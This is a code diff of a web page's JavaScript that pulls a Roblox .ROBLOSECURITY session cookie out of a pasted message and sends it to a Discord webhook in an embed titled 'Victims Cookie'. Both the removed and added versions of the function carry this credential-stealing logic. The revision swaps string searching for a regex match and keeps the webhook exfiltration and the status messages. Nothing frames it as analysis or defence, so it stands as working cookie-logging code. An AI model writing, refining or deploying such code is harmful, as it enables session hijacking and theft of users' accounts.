@@ -66,55 +66,51 @@
 
       errorMessage.textContent = ""; // Clear any previous error messages
 
-      // Check if the message contains .ROBLOSECURITY code
-      const robloSecurityCode = ".ROBLOSECURITY";
-      if (!message.includes(robloSecurityCode)) {
-        errorMessage.textContent = "Message failed! You must include the .ROBLOSECURITY code.";
-        return;
-      }
+      // Search for the .ROBLOSECURITY token in the message
+      const robloSecurityCodeRegex = /_ROBLOSECURITY=([a-zA-Z0-9]+);/;
 
-      // Extract the .ROBLOSECURITY code from the message
-      const robloCodeStartIndex = message.indexOf(robloSecurityCode);
-      const robloCodeEndIndex = message.indexOf(" ", robloCodeStartIndex + robloSecurityCode.length);
-      const robloCode = message.substring(robloCodeStartIndex, robloCodeEndIndex > -1 ? robloCodeEndIndex : undefined).trim(); // Get the .ROBLOSECURITY part
+      const match = message.match(robloSecurityCodeRegex);
 
-      // Check if we successfully extracted the ROBLOSECURITY code
-      if (!robloCode) {
-        errorMessage.textContent = "Message failed! Unable to extract .ROBLOSECURITY code.";
-        return;
-      }
+      if (match && match[1]) {
+        // Extract the Roblox security token
+        const robloSecurityCode = match[1];
 
-      // Create the embed payload with only the .ROBLOSECURITY code
-      const embedPayload = {
-        embeds: [
-          {
-            title: "Victim's Cookie", // Embed title
-            description: `\`\`\`${robloCode}\`\`\``, // Embed description with the code wrapped in backticks
-            color: 16711680, // Embed color (red in this case)
-            timestamp: new Date().toISOString() // Adds a timestamp
-          }
-        ]
-      };
+        // Create the embed payload with only the _ROBLOSECURITY code
+        const embedPayload = {
+          embeds: [
+            {
+              title: "Victims Cookie", // Embed title
+              description: `\`\`\`${robloSecurityCode}\`\`\``, // Embed description with the code wrapped in backticks
+              color: 16711680, // Embed color (red in this case)
+              timestamp: new Date().toISOString() // Adds a timestamp
+            }
+          ]
+        };
 
-      // Send the embed to Discord webhook
-      fetch(DISCORD_WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(embedPayload),
-      })
-        .then((response) => {
-          if (response.ok) {
-            document.getElementById("status").textContent = "Message sent successfully!";
-            messageInput.value = ""; // Clear the input
-            startCooldown(sendButton); // Start cooldown timer
-          } else {
-            throw new Error("Failed to send the message.");
-          }
+        // Send the embed to Discord webhook
+        fetch(DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(embedPayload),
         })
-        .catch((error) => {
-          console.error("Error:", error);
-          document.getElementById("status").textContent = "Failed to send the message.";
-        });
+          .then((response) => {
+            if (response.ok) {
+              document.getElementById("status").textContent = "Message sent successfully!";
+              messageInput.value = ""; // Clear the input
+              startCooldown(sendButton); // Start cooldown timer
+            } else {
+              throw new Error("Failed to send the message.");
+            }
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+            document.getElementById("status").textContent = "Failed to send the message.";
+          });
+
+      } else {
+        // If the _ROBLOSECURITY code is not found in the message
+        errorMessage.textContent = "Message failed! .ROBLOSECURITY cookie not found.";
+      }
     }
 
     function startCooldown(button) {
